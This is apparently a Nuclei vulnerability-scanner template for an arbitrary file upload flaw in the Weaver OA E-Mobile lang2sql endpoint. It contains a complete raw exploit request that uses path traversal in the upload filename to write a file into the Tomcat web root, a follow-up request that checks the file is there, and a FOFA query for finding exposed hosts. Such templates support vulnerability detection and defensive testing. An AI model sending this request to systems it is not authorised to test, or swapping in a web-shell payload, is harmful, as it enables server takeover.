id: weaver-emobile-lang2sql-fileupload
info:
  name: weaver-emobile-lang2sql-fileupload
  author: leadlife
  severity: critical
  description: 泛微OA E-Mobile 移动管理平台 lang2sql 接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件从而控制整个服务器。
  reference: 
    - https://github.com/wy876/POC/blob/8c65f6317950b5e6862ad49c777b5d743fd18aae/%E6%B3%9B%E5%BE%AEOA-E-Mobile%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="泛微-EMobile" && icon_hash="2062026853"
  tags: weaver,emobile,fileupload,oa

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
        Content-Length: 265
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Sl-Ce-Suid: 15
        Upgrade-Insecure-Requests: 1
        Accept-Encoding: gzip, deflate, br
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="source"


        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/{{num}}.txt"

        {{randstr}}
        --00content0boundary00--
      
      - |
        GET /{{num}}.txt HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2, '{{randstr}}')"
        condition: and